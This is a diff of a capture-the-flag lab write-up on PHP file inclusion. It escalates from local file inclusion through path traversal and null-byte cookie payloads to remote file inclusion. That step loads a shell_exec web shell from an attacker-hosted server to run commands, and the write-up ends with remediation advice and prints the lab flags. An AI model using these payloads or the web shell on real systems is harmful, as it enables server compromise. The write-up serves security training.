@@ -1,96 +1,165 @@
-📂 Lab: File Inclusion (LFI → RFI → RCE)
-📖 Overview
-This lab focuses on identifying and exploiting improper file handling in PHP applications. The goal is to move from Local File Inclusion (LFI) to Remote File Inclusion (RFI), eventually achieving Remote Code Execution (RCE).
+# 📂 Lab: File Inclusion (LFI → RFI → RCE)
 
-🔍 Vulnerability Analysis
-The application uses the following vulnerable PHP code:
+![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-blue?style=for-the-badge&logo=tryhackme)
+![Vulnerability](https://img.shields.io/badge/Type-LFI%20%7C%20RFI%20%7C%20RCE-red?style=for-the-badge)
+![Difficulty](https://img.shields.io/badge/Difficulty-Beginner%2FIntermediate-orange?style=for-the-badge)
 
-PHP
+---
 
+## 📖 Overview
+
+This lab demonstrates how improper file handling in PHP applications can be exploited to escalate from **Local File Inclusion (LFI)** to **Remote File Inclusion (RFI)** and finally achieve **Remote Code Execution (RCE)**.
+
+The walkthrough covers multiple attack vectors, including POST manipulation, cookie injection, path traversal, and null byte injection.
+
+---
+
+## 🔍 Vulnerability Analysis
+
+The vulnerable PHP code used by the application:
+
+```php
+<?php
 $profile = $_REQUEST['file'];
 include($profile);
-[!CAUTION] The Risk: The include() function directly processes user-controlled input without sanitization. This allows for:
+?>
+⚠️ Security Risk
+User-controlled input is passed directly to include() without validation, allowing:
 
-Reading sensitive system files (LFI/Path Traversal).
+Reading sensitive files (LFI / Path Traversal)
 
-Executing external scripts if allow_url_include is enabled (RFI).
+Including remote files (RFI)
 
-Execution of arbitrary PHP code (RCE).
+Executing arbitrary PHP code (RCE)
 
 🚩 Challenge Walkthrough
-1️⃣ Challenge 1: LFI via POST
-Scenario: The input is not accepted via GET parameters. The backend expects a POST request.
+1️⃣ Challenge 1 — LFI via POST
+Scenario
 
-Method:
+The form does not accept GET parameters
 
-Intercepted the request and changed the form method from GET to POST.
+The backend expects a POST request
 
-Submitted the payload via the file parameter.
+Exploitation
 
-Payload: /etc/flag1
+Modified the form method from GET to POST
 
-Result: ✅ Flag 1 Retrieved
+Submitted the following payload:
 
-2️⃣ Challenge 2: Cookie Injection & Path Traversal
-Scenario: Authorization is based on a cookie, and the application appends .php to the input.
+text
+Копировать код
+file=/etc/flag1
+Result
 
-Analysis: Cookie THM=Guest. Changing it to Admin grants access, but the server expects a file path.
+✅ Flag 1 successfully retrieved
 
-Exploitation: Used Path Traversal to escape the directory and a Null Byte (%00) to terminate the string and bypass the .php extension.
+2️⃣ Challenge 2 — Cookie Injection & Path Traversal
+Scenario
 
-Payload (Cookie): ../../../../etc/flag2%00
+Access restricted to admins
 
-Result: ✅ Flag 2: c00k13_i5_yuMmy1
+Authorization based on a cookie
 
-3️⃣ Challenge 3: Multi-Vector Inclusion (POST + Cookie + Token)
-Scenario: The application checks multiple inputs simultaneously.
+Analysis
 
-Exploitation: Injected the traversal payload into both the POST file parameter and the token cookie to satisfy backend requirements.
+Default cookie value: THM=Guest
 
-Payload: ../../../../etc/flag3%00
+Changing it to Admin grants access
 
-Result: ✅ Flag 3 Retrieved
+Application appends .php to the cookie value
+
+Exploitation
+
+Used Path Traversal to escape the directory
+
+Used Null Byte injection to bypass .php extension
+
+text
+Копировать код
+THM=../../../../etc/flag2%00
+Result
+
+✅ Flag 2 retrieved
+
+text
+Копировать код
+c00k13_i5_yuMmy1
+3️⃣ Challenge 3 — Multi‑Vector File Inclusion
+Scenario
+
+Backend validates multiple inputs simultaneously:
+
+POST parameter
+
+Cookie
+
+Token
+
+Exploitation
+
+Injected the payload into all required parameters
+
+text
+Копировать код
+../../../../etc/flag3%00
+Result
+
+✅ Flag 3 successfully retrieved
 
 💥 Path to RCE (Remote Code Execution)
-Objective: Achieve command execution on the target host by hosting a malicious script.
+🎯 Objective
+Execute system commands on the target host via Remote File Inclusion
 
-Step 1: Prepare the Web Shell
-Created a simple PHP script to execute system commands:
+Step 1️⃣ — Prepare the Web Shell
+Created a malicious PHP file to execute system commands:
 
-PHP
+php
+Копировать код
+<?php
+echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+?>
+Step 2️⃣ — Host the Payload
+Started a local HTTP server on the attacker machine:
 
-<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; ?>
-Step 2: Host the Payload
-Started a local Python HTTP server on the attacker machine (AttackBox):
-
-Bash
-
+bash
+Копировать код
 python3 -m http.server 9001
-Step 3: Trigger RFI
-Exploited the playground.php page by pointing the file parameter to the hosted malicious script:
+Step 3️⃣ — Trigger RFI
+Injected the remote file via the vulnerable endpoint:
 
-Plaintext
-
+text
+Копировать код
 http://<TARGET-IP>/playground.php?file=http://<ATTACKBOX-IP>:9001/shell.php&cmd=hostname
-✅ Result:
+✅ Result
+Command Executed
 
-Command Executed: hostname
+text
+Копировать код
+hostname
+Output
 
-Output: lfi-vm-thm-f8c5b1a78692
+text
+Копировать код
+lfi-vm-thm-f8c5b1a78692
+Impact
 
-Impact: Full System Compromise achieved.
+🔥 Full Remote Code Execution achieved
+
+🔥 Complete system compromise possible
 
 🛡️ Remediation & Best Practices
-Mitigation	Action
-Disable Dangerous Settings	Set allow_url_include = Off in php.ini.
-Input Validation	Use a whitelist of allowed files instead of direct user input.
-Path Normalization	Use filesystem functions to validate the path and prevent ../ attacks.
-Filesystem Security	Run the web server with minimal privileges (Principle of Least Privilege).
-
-Экспортировать в Таблицы
+Issue	Mitigation
+Unsafe include()	Use a strict whitelist
+RFI	Disable allow_url_include
+Path Traversal	Normalize and validate paths
+Privilege Abuse	Run services with least privilege
+Auth via Cookies	Never trust client-side authorization
 
 🏁 Conclusion
-The lab successfully demonstrated the critical transition from simple file reading to full server takeover. Understanding how to manipulate different input vectors (Cookies, POST, Tokens) is essential for modern web penetration testing.
+This lab clearly demonstrates how a simple file inclusion vulnerability can escalate into full server compromise.
 
-Author: CyberDat | Date: January 2026
+Understanding how to combine multiple input vectors (POST, Cookies, Tokens) is essential for real‑world web penetration testing.
 
+Author: CyberDat
+Date: January 2026
+Platform: TryHackMe
